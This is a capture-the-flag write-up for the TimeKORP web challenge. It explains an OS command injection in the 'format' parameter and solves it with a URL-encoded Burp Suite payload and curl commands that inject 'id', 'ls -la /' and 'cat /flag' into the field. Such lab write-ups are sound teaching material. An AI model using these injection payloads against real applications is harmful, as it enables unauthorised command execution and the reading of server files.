# TimeKORP — OS Command Injection

## 📌 CTF Overview

- **Category:** Web
- **Vulnerability:** OS Command Injection
- **Parameter:** `format`
- **Tool Used:** Burp Suite, cURL

## 🎯 Objective

Identify and exploit an OS command injection vulnerability in the TimeKORP web application to retrieve the CTF flag.

## 🔍 Vulnerability Explanation

The application processes user input from the `format` parameter to generate a time string. Insufficient input validation can allow specially crafted input to interfere with the server-side command and potentially execute unintended shell commands.

## 💻 Solution 1 — Using Burp Suite

### Step 1: Intercept the Request

- **Proxy → HTTP history**.
- Find the request to the TimeKORP application.
- Right-click the request and select **Send to Repeater**.

### Step 2: Modify the Request

Modify the `format` parameter with the following payload:

```text
?format=%25H%3A%25M%3A%25S%27%26cat%20../flag%26%27
```

The payload preserves the original time format and attempts to inject the `cat ../flag` command.

### Step 3: Send the Request

Click **Send** in Repeater to submit the modified request to the server.

### Step 4: Retrieve the Flag

Inspect the HTTP response body. The flag is returned if the injected command executes successfully and its output is included in the response.

## 💻 Solution 2 — Using Terminal Commands

### Step 1: Set the Target URL

```bash
export TARGET='http://TARGET_HOST:TARGET_PORT'
```

Stores the target URL in an environment variable so it can be reused in subsequent commands. Replace the placeholder with the assigned CTF instance URL.

### Step 2: Test Command Injection

```bash
curl -sG "$TARGET/" --data-urlencode "format='; id; #"
```

Sends a GET request with a crafted `format` parameter to test whether shell command injection is possible.

### Step 3: Investigate the Execution Environment

```bash
curl -sG "$TARGET/" --data-urlencode "format='; id; ls -la /; cat /flag; #"
```

Attempts to display the command's execution identity, list the root directory, and read `/flag`. The file path may differ from the challenge's actual location.

### Step 4: Extract the Flag

```bash
curl -sG "$TARGET/" --data-urlencode "format='; cat /flag; #" | grep -oE 'HTB\{[^}]+\}'
```

Filters the HTTP response for a flag matching the expected `HTB{...}` format. This works only if the command executes, the flag is at `/flag`, and the response contains the flag text.

## ✅ Conclusion

The TimeKORP challenge demonstrated how insufficient protection of user-controlled input can lead to OS command injection. Burp Suite Repeater helped modify the HTTP request, while the injected command was used to retrieve the CTF flag.
